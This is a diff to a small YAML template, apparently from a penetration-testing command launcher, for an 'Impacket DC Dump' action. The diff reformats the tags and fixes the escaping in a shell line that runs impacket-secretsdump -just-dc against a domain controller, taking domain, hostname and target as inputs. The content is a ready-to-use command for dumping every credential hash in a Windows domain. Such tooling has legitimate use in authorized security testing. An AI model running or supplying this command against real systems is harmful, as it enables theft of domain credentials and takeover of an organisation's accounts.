@@ -1,12 +1,7 @@
 name: Impacket DC Dump
 description: Dump domain credentials via Impacket secretsdump (just-dc).
-tags:
-  - windows
-  - impacket
-  - secretsdump
-  - domain-controller
-  - credentials
-shell: "impacket-secretsdump -just-dc {{domain}}/{{hostname}}\$@{{target}}"
+tags: [windows, impacket, secretsdump, domain-controller, credentials]
+shell: "impacket-secretsdump -just-dc {{domain}}/{{hostname}}$@{{target}}"
 inputs:
   - id: target
     prompt: "Target IP or hostname"
